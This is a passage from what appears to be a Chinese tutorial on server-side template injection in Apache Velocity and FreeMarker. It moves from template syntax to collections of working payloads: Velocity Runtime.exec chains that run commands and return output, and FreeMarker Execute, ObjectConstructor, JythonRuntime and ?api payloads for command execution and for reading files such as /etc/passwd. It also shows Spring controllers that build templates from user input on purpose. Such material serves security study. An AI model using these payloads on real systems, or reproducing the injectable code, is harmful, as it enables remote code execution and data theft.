循环</h4><p>Velocity模板中list集合循环语法</p><p>循环遍历,可以得到每个元素,每个元素的序号,以及总的集合长度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#foreach ( $element in $list)</span><br><span class="line">## 集合中每个元素</span><br><span class="line">$element</span><br><span class="line">## 集合的序号 从<span class="number">1</span>开始</span><br><span class="line">$&#123;velocityCount&#125;</span><br><span class="line">## 集合的长度</span><br><span class="line">$&#123;list.size()&#125;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>map集合循环语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#foreach ($entry in $map.entrySet())</span><br><span class="line">## map的key   map的value值</span><br><span class="line">$entry.key =&gt; $entry.value</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h4 id="5-条件">5 条件</h4><p>Velocity模板中条件语法if-ifelse-else结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#elseif (condition2)</span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>常用的条件语句是if-else结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p><strong>#break</strong></p><p>表示跳出循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line">## 条件符合跳过</span><br><span class="line">#<span class="keyword">if</span>($user == <span class="string">&quot;李白&quot;</span>)</span><br><span class="line">    #<span class="keyword">break</span>;</span><br><span class="line">    #end</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">// 执行业务</span></span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p><strong>#stop</strong></p><p>表示终止指令,终止模板解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#<span class="keyword">if</span> (condition1)</span><br><span class="line">## 条件符合直接终止</span><br><span class="line">#<span class="keyword">if</span>($user == <span class="string">&quot;李白&quot;</span>)</span><br><span class="line">    #stop</span><br><span class="line">    #end</span><br><span class="line">    #<span class="keyword">else</span></span><br><span class="line">    <span class="comment">// 执行业务</span></span><br><span class="line">    #end</span><br></pre></td></tr></table></figure><h4 id="6-注释">6 注释</h4><p>单行注释 ##</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码## 定义一个user变量为李白</span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>多行注释 #* *#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#*  </span><br><span class="line">定义一个user变量</span><br><span class="line">将user变量赋值为 李白</span><br><span class="line">*#</span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>文档注释 #** *#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码 #** </span><br><span class="line"><span class="meta">@version</span> <span class="number">1.1</span></span><br><span class="line"><span class="meta">@author</span>  李白</span><br><span class="line">*#</span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="7-引入资源">7 引入资源</h4><p><strong>#include</strong></p><p>表示引入外部资源，引入的资源不被引擎所解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#include( <span class="string">&quot;one.gif&quot;</span>,<span class="string">&quot;two.txt&quot;</span>,<span class="string">&quot;three.htm&quot;</span> )</span><br></pre></td></tr></table></figure><p><strong>#parse</strong></p><p>用于导入脚本, 引入的资源会被引擎所解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码##  a.vm文件</span><br><span class="line">#set($user = <span class="string">&quot;李白&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## b.vm文件</span><br><span class="line">#parse(<span class="string">&quot;a.vm&quot;</span>)</span><br><span class="line">## 变量   值</span><br><span class="line">$user  李白</span><br></pre></td></tr></table></figure><h3 id="常见POC">常见POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命令执行1</span></span><br><span class="line">#set($e=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;open -a Calculator&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行2 </span></span><br><span class="line">#set($x=<span class="string">&#x27;&#x27;</span>)##</span><br><span class="line">#set($rt = $x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>))##</span><br><span class="line">#set($chr = $x.class.forName(<span class="string">&#x27;java.lang.Character&#x27;</span>))##</span><br><span class="line">#set($str = $x.class.forName(<span class="string">&#x27;java.lang.String&#x27;</span>))##</span><br><span class="line">#set($ex=$rt.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))##</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())##</span><br><span class="line">#foreach( $i in [<span class="number">1.</span>.$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行3</span></span><br><span class="line">#set ($e=<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">#set ($a=$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(<span class="string">&quot;java.lang.Process&quot;</span>).getMethod(<span class="string">&quot;getInputStream&quot;</span>).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(<span class="string">&quot;java.util.Scanner&quot;</span>))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(<span class="string">&quot;java.io.InputStream&quot;</span>)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(<span class="string">&quot;\A&quot;</span>))</span><br><span class="line">#<span class="keyword">if</span>($scan.hasNext())</span><br><span class="line">$scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h4 id="evaluate例子：">evaluate例子：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javasecssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/ssti/velocity&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">velocity1</span><span class="params">(<span class="meta">@RequestParam(defaultValue=&quot;nth347&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="string">&quot;Hello, &quot;</span> + username + <span class="string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Velocity.init();</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        <span class="comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span></span><br><span class="line">        Velocity.evaluate(ctx, out, <span class="string">&quot;test&quot;</span>, templateString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;cmd /C calc&quot;</span>)</span><br></pre></td></tr></table></figure><p>弹出计算机</p><h4 id="merage">merage:</h4><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p><p>template ：待处理的 Velocity 模板。</p><p>context ：上下文数据，即用于替换模板中占位符的数据。</p><p>writer ：输出结果的写入器，用于将生成的结果写入到指定位置。</p><p>创建对应的code</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/ssti/velocity2&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;nth347&quot;)</span> String username)</span> <span class="keyword">throws</span> IOException, ParseException, org.apache.velocity.runtime.parser.ParseException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(<span class="string">&quot;/path/to/template.vm&quot;</span>)));</span><br><span class="line">    templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(templateString);</span><br><span class="line"></span><br><span class="line">    <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">    ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">    org.apache.velocity.<span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.velocity.Template();</span><br><span class="line"></span><br><span class="line">    <span class="type">RuntimeServices</span> <span class="variable">runtimeServices</span> <span class="operator">=</span> RuntimeSingleton.getRuntimeServices();</span><br><span class="line">    <span class="type">SimpleNode</span> <span class="variable">node</span> <span class="operator">=</span> runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line"></span><br><span class="line">    template.setRuntimeServices(runtimeServices);</span><br><span class="line">    template.setData(node);</span><br><span class="line">    template.initDocument();</span><br><span class="line"></span><br><span class="line">    template.merge(ctx, out);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板文件template.vm内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is &lt;USERNAME&gt;.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">这段代码的主要作用是读取Velocity模板文件，替换模板中的占位符，然后使用给定的上下文对象进行模板渲染，并将渲染结果作为字符串返回<br></font>过程：</p><ul><li>使用templateString.replace对模板文件里的内容进行替换，这里的替换值可控</li><li>runtimeServices.parse将模板内容进行解析</li><li>template.merge(ctx, out);将模板内容进行渲染，这里会调用SimpleNode#render，过程大致和上面一致</li></ul><p>从指定路径读取模板文件，如果模板文件中带有攻击载荷语句，即可通过 template.merge 渲染触发模 板注入漏洞。所以我们需要修改vm渲染文件。</p><p>假设我们到了后台，有模板修改的功能，那我们便可修改vm文件来进行攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;sss&quot;</span>);</span><br><span class="line">$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="FreeMarker简介">FreeMarker简介</h2><p>FreeMarker 是一款 <em>模板引擎</em>： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p><p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p><h3 id="FreeMarker语法">FreeMarker语法</h3><p>说白了FreeMarker和JSP的EL表达式差不多 或者 跟thymleaf的语法是差不多的。</p><p>都是使用${} 或者标签。</p><h3 id="FreeMarker常用语法">FreeMarker常用语法</h3><h4 id="if指令">if指令</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#<span class="keyword">if</span> name==<span class="string">&#x27;李四&#x27;</span>&gt;</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="list指令">list指令</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testList</span><span class="params">(Map&lt;String,Object&gt; map)</span>&#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt;  users = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lisi&quot;</span>,<span class="number">15</span>));</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="number">25</span>));</span><br><span class="line">    users.add(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">25</span>));</span><br><span class="line">    map.put(<span class="string">&quot;lists&quot;</span>,users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test2&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;#list lists as u&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> u_index%<span class="number">2</span>==<span class="number">0</span> &gt;&lt;tr style=<span class="string">&quot;background-color: red&quot;</span>&gt;&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">if</span> u_index%<span class="number">2</span>!=<span class="number">0</span>&gt;&lt;tr style=<span class="string">&quot;background-color: green&quot;</span>&gt;&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;$&#123;u.name&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;u.age&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h4 id="遍历Map">遍历Map</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMap</span><span class="params">(Map&lt;String,Object&gt; map)</span>&#123;</span><br><span class="line">    HashMap&lt;String, Object&gt;  mp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    mp.put(<span class="string">&quot;1&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lisi&quot;</span>,<span class="number">15</span>));</span><br><span class="line">    mp.put(<span class="string">&quot;2&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">19</span>));</span><br><span class="line">    mp.put(<span class="string">&quot;3&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="number">20</span>));</span><br><span class="line">    map.put(<span class="string">&quot;ma&quot;</span>,mp);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;#list ma?keys as k&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;$&#123;ma[k].name&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;ma[k].age&#125;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/#list&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h4 id="空值处理">空值处理</h4><p>?? 判断是不为空</p><p>${name!“”} name 为空时 显示 “”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;#<span class="keyword">if</span> name??&gt;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;#<span class="keyword">if</span> name??&gt;</span><br><span class="line">$&#123;name!<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&lt;/#<span class="keyword">if</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="FreeMarker注入">FreeMarker注入</h3><h4 id="内置函数">内置函数</h4><h5 id="new">new</h5><p>可创建任意实现了TemplateModel接口的Java对象，同时还可以触发没有实现 TemplateModel接口的类的静态初始化块。以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承TemplateModel接口的freemarker.template.utility.JythonRuntime和freemarker.template.utility.Execute。</p><h5 id="API">API</h5><p>value?api 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod() 或 value?api.someBeanProperty。可通过 getClassLoader获取类加载器从而加载恶意类，或者也可以通过 getResource来实现任意文件读取。但是，当api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false。</p><h5 id="一些poc1">一些poc1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;open -a Calculator.app&quot;</span><span class="string">&quot;)&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign value=&quot;</span>freemarker.template.utility.ObjectConstructor<span class="string">&quot;?new()&gt;$&#123;value(&quot;</span>java.lang.ProcessBuilder<span class="string">&quot;,&quot;</span>whoami<span class="string">&quot;).start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign value=&quot;</span>freemarker.template.utility.JythonRuntime<span class="string">&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;</span>calc.exe<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign ex=&quot;</span>freemarker.template.utility.Execute<span class="string">&quot;?new()&gt; $&#123; ex(&quot;</span>open -a Calculator.app<span class="string">&quot;) &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">读取文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;#assign is=object?api.class.getResourceAsStream(&quot;</span>/Test.class<span class="string">&quot;)&gt;</span></span><br><span class="line"><span class="string">FILE:[&lt;#list 0..999999999 as _&gt;</span></span><br><span class="line"><span class="string">    &lt;#assign byte=is.read()&gt;</span></span><br><span class="line"><span class="string">    &lt;#if byte == -1&gt;</span></span><br><span class="line"><span class="string">        &lt;#break&gt;</span></span><br><span class="line"><span class="string">    &lt;/#if&gt;</span></span><br><span class="line"><span class="string">$&#123;byte&#125;, &lt;/#list&gt;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;#assign uri=object?api.class.getResource(&quot;</span>/<span class="string">&quot;).toURI()&gt;</span></span><br><span class="line"><span class="string">&lt;#assign input=uri?api.create(&quot;</span>file:<span class="comment">///etc/passwd&quot;).toURL().openConnection()&gt;</span></span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span 